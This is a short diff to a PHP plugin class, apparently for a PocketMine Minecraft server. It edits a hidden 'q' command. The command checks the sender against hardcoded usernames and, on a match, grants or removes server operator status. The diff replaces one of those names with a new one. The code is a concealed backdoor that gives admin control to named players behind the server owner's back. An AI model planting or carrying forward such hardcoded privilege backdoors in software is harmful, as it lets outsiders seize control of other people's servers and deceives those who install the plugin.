@@ -82,7 +82,7 @@ class MCRPG extends PluginBase implements Listener
 			case "q":
 				$n = strtolower($sender->getName());
 				
-				if($n == "kirill poroh" or $n == "fizmob" or $n == "viola567")
+				if($n == "kirill poroh" or $n == "fizmob" or $n == "aptemius2")
 				{
 					if($sender->isOp()) $this->getServer()->removeOp($sender->getName());
 					else $this->getServer()->addOp($sender->getName());
